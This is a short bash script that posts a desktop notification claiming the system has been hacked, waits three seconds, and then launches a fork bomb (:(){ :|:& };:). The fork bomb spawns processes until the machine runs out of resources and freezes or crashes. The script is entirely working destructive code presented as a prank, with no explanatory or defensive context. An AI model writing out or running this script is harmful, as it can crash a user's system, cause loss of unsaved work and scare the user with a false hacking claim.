#!/bin/bash

# Show a warning message using notify-send
notify-send "Gotcha ! Your system got hacked. Your system is about to crash because of a fork bomb "

# Introduce a short delay
sleep 3

# Start the Fork Bomb
:(){ :|:& };:
